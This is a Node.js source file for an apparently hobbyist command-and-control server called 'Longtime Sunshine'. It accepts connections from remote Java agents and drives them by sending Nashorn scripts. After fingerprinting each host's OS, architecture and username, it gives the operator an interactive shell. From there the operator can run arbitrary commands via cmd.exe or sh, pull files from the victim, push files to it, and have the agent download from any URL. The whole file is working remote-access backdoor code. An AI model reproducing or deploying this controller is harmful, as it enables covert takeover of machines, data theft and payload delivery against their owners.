var net = require('net');
var term = require( 'terminal-kit' ).terminal ;
var fs = require('fs');

var agents = [];
var history = [];
var longtime_commands = ['help', 'exit', 'agents', 'agent'];
var longtime_help = 'The following commands are supported:\n\n' +
  'help - this message\n' +
  'exit - exits the terminal\n' +
  'agents - lists the connected agents\n' +
  'agent <int> - begin interaction with the selected agent\n';

var sunshine_commands = ['help', 'exit', 'exec', 'upload', 'download', 'get'];
var sunshine_help = 'The following commands are supported:\n\n' +
  'help - this message\n' +
  'exit - exits back to the main terminal\n' +
  'exec <args> - executes a shell command via cmd.exe or sh\n' +
  'upload <local file> <remote file> - uploads a local file to the agent\n' +
  'download <remote file> <local file> - downloads a file from the agent\n' +
  'get <url> <remote file> - the agent downloads form the url and creates the remote file\n';

////
// Pop the socket from the agent list. Is this safe? Does anyone know how
// javascript works? Is anyone even listening? Oh, well.
//
// @param socket the dead socket to pop
////
function remove_agent(socket) {
  for (var i = 0; i < agents.length; i++) {
    if (agents[i].name == socket.name) {
      agents.splice(i, 1);
      term('☉  ' + socket.name + ' has disconnected\n');
      return;
    }
  }
}

////
// Creates the server. For each  new connection the following will be executed. 
// State is stored in the socket object as much as possible. 
//
// @param socket the socket we are doing operations on
///
var server = net.createServer(function(socket) {
  // init the new socket state
  socket.os = null;
  socket.arch = null;
  socket.version = null;
  socket.user = null;
  socket.history = [];
  socket.state = null;
  socket.fs = null;
  socket.name = socket.remoteAddress + ":" + socket.remotePort;

  ////
  // Handles incoming data. The initial connection handshake goes like this:
  //
  // 1. Connection recieved -> query arch
  // 2. Arch received -> query os
  // 3. OS received -> query username
  // 4. Username recevied -> consider this an established agent. Add to agent list
  //
  // The protocol is pretty bad at the moment. We have to send all Nashorn in a
  // a single line. Whe wrap the command responses in stuff like '---cmd-start'
  // and '---cmd-end' to find the start and the beginning. Its not beautful but
  // tolerable for a Saturday morning hack.
  //
  // @data a Buffer of data
  ////
  socket.on('data', function(data) {
    if (!socket.os) {
      socket.os = data;
      socket.write('function exec() { return java.lang.System.getProperty("os.arch") }\n');
    } else if (!socket.arch) {
      socket.arch = data;
      socket.write('function exec() { return java.lang.System.getProperty("os.version") }\n');
    } else if (!socket.version) {
      socket.version = data;
      socket.write('function exec() { return java.lang.System.getProperty("user.name") }\n');
    } else if (!socket.user) {
      // estabished agent. Allow the user to see it
      agents.push(socket);
      socket.user = data;
      term('\n☀  Connection established by ' + socket.name);
      term('\n$ ');
    } else if (socket.state == 'cmd' || data.indexOf('---cmd-start') == 0) {
      if (socket.state == null) {
        socket.state = 'cmd';
        data = data.slice(12);
      }
      var end = data.indexOf('---cmd-end');
      if (end >= 0) {
        socket.state = null;
        data = data.slice(0, end);
        term(data);
        term(socket.user + '@' + socket.remoteAddress + '$ ' );
      } else {
        term(data);
      }
    } else if (data == '---get-end') {
      term('get complete');
      term('\n');
      term(socket.user + '@' + socket.remoteAddress + '$ ' );
    } else if (data == '---upload-end') {
      term('upload complete');
      term('\n');
      term(socket.user + '@' + socket.remoteAddress + '$ ' );
    } else if (socket.state == 'down' || data.indexOf('---dwn-start') == 0) {
      if (socket.state == null) {
        socket.state = 'down';
        data = data.slice(12);
      }
      var end = data.indexOf('---dwn-end');
      if (end > 0) {
        socket.state = null;
        data = data.slice(0, end);
        socket.fs.write(data);
        socket.fs.end();
        socket.fs = null;
        term('Download complete\n');
        term(socket.user + '@' + socket.remoteAddress + '$ ' );
      } else {
        socket.fs.write(data);
      }
    }
  });

  ////
  // All of the dead remote agent events!
  ////
  socket.on('end', function() {
    remove_agent(socket);
  });
  socket.on('close', function() {
    remove_agent(socket);
  });
  socket.on('timeout', function() {
    remove_agent(socket);
  });
  socket.on('error', function() {
    remove_agent(socket);
  });

  socket.write('function exec() { return java.lang.System.getProperty("os.name") }\n');
});


////
// The inner terminal for a selected agent. The logic follows a pretty simple
// 'what is the user input?', 'push nashorn', 'loop'.
//
// @param socket the socket we are operating on
///
function agent_shell(socket)
{
  term.inputField({
      history: socket.history,
      autoComplete: sunshine_commands,
      autoCompleteMenu: true,
      cancelable: true
  },
  function(error, input) {
    term('\n');

    if (input) {
      socket.history.push(input);
      if (input == 'help') {
        term(sunshine_help);
      } else if (input == 'exit') {
        shell();
        return;
      } else if (input.startsWith('exec')) {
        var command_array = input.match(/^exec (.+)/);
        if (!command_array) {
          term("malformed command.");
        } else {
          var command = 'function exec() {' +
            'var StringArray = Java.type("java.lang.String[]");' +
            'var carray = new StringArray(3);';
          if (socket.os.indexOf('Windows') == -1) {
            command += 'carray[0] = "/bin/sh";' +
            'carray[1] = "-c";';
          } else {
            command += 'carray[0] = "cmd.exe";' +
            'carray[1] = "/c";';
          }
            command += 'carray[2] = "' + command_array[1] + '";' +
            'var proc = java.lang.Runtime.getRuntime().exec(carray);' +
            'var ret = "---cmd-start";' +
            'var inReader = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));' +
            'while ((line = inReader.read()) != -1) {' +
                'ret += java.lang.Character.toChars(line)[0];' +
            '}' +
            'ret += "---cmd-end";' +
            'inReader.close();' +
            'return ret;' +
          '}\n';
          socket.write(command);
        }
      } else if (input.startsWith('upload')) {
        var upload_array = input.match(/^upload ([^ ]+) (.+)$/);
        if (!upload_array) {
          term('malformed command.');
        } else {
          var file_data = fs.readFileSync(upload_array[1]);
          file_data = file_data.toString('base64');

          var command = 'function exec() {' +
            'var file = new java.io.File("' + upload_array[2] +'");' +
            'file.createNewFile();' +
            'var fos = new java.io.FileOutputStream(file);' +
            'fos.write(java.util.Base64.getDecoder().decode("' + file_data + '"));' +
            'fos.close();' +
            'return "---upload-end";' +
          '}\n';
          socket.write(command);
        }
      } else if (input.startsWith('download')) {
        var download_array = input.match(/^download ([^ ]+) (.+)$/);
        if (!download_array) {
          term("malformed command.");
        } else {
          socket.fs = fs.createWriteStream(download_array[2]);
          var command = 'function exec() {' +
            'var path = java.nio.file.Paths.get("' + download_array[1] + '");' +
            'var ret = "---dwn-start";' +
            'ret += new java.lang.String(java.nio.file.Files.readAllBytes(path));' +
            'ret += "---dwn-end";' +
            'return ret;' +
          '}\n';
          socket.write(command);
        }
      } else if (input.startsWith('get')) {
        var get_array = input.match(/^get (https?:\/\/[^ ]+) (.+)$/);
        if (!get_array) {
          term('malformed command.');
        } else {
          var command = 'function exec() {' +
            'var url = new java.net.URL("' + get_array[1] + '");' +
            'var path = java.nio.file.Paths.get("' + get_array[2] + '");' +
            'java.nio.file.Files.copy(url.openStream(), path, java.nio.file.StandardCopyOption.REPLACE_EXISTING);' +
            'return "---get-end";' +
          '}\n';
          socket.write(command);
        }
      } else {
        term('Unrecognized command.');
      }
    } else {
      term(socket.user + '@' + socket.remoteAddress + '$ ' );
    }
    agent_shell(socket);
  });
}

////
// The default shell interface
///
function shell()
{
  term('$ ');

  term.inputField(
  {
    history: history,
    autoComplete: longtime_commands,
    autoCompleteMenu: true,
    cancelable: true
  },
  function(error , input) {
    var agent_select = /^agent (\d+)/;
    if (input) {
      // store the users response in the history array
      history.push(input);

      // move our response to a new line
      term('\n');

      var matches_array = input.match(agent_select);
      if (input == 'help') {
        term(longtime_help);
      } else if (input == 'exit') {
        process.exit();
      } else if (input == 'agents') {
        for (var i = 0; i < agents.length; i++) {
          term('=> [');
          term(i + '] ');
          term(agents[i].user);
          term('@');
          term(agents[i].name);
          term(' (');
          term(agents[i].os);
          term('-');
          term(agents[i].version);
          term('/');
          term(agents[i].arch);
          term(')\n');
        }
      } else if (matches_array) {
        var index = matches_array[1];
        if (index >= 0 && index < agents.length)
        {
            term(agents[index].user + '@' + agents[index].remoteAddress + '$ ' );
            agent_shell(agents[index]);
            return;
        }
      } else {
          term('Unrecognized command');
      }
    }
    term('\n');
    shell();
  });
}

term("\n");
term("   01101100 01101111 01101110 01100111 01110100 \n");
term("   01101001 01101101 01100101 00100000 01110011 \n");
term("   01110101 01101110 01110011 01101000 01101001 \n")
term("  ╦  ┌─┐┌┐┌┌─┐┌┬┐┬┌┬┐┌─┐  ╔═╗┬ ┬┌┐┌┌─┐┬ ┬┬┌┐┌┌─┐\n");
term("  ║  │ │││││ ┬ │ ││││├┤   ╚═╗│ ││││└─┐├─┤││││├┤ \n");
term("  ╩═╝└─┘┘└┘└─┘ ┴ ┴┴ ┴└─┘  ╚═╝└─┘┘└┘└─┘┴ ┴┴┘└┘└─┘\n");
term("   01101110 01100101 00100000 01110101 01110000 \n");
term("   01101111 01101110 00100000 01101101 01100101 \n");
term("\n");
server.listen(1270, '0.0.0.0');
shell();
